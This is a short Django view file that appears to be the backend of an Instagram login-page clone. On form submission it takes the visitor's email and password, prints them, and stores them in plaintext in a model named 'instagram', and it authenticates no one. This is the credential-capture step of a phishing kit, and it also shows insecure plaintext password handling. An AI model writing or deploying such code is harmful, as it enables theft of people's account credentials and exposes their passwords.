from django.shortcuts import render,HttpResponse
from django.db.models.base import Model
from inst.models import instagram



# Create your views here.
def index(request):
     if request.method == 'POST':
          email = request.POST['email']
          password= request.POST['password']
          print(email, password)
          index= instagram(email =email ,password=password)
          index.save()
     return render(request, 'index.html')
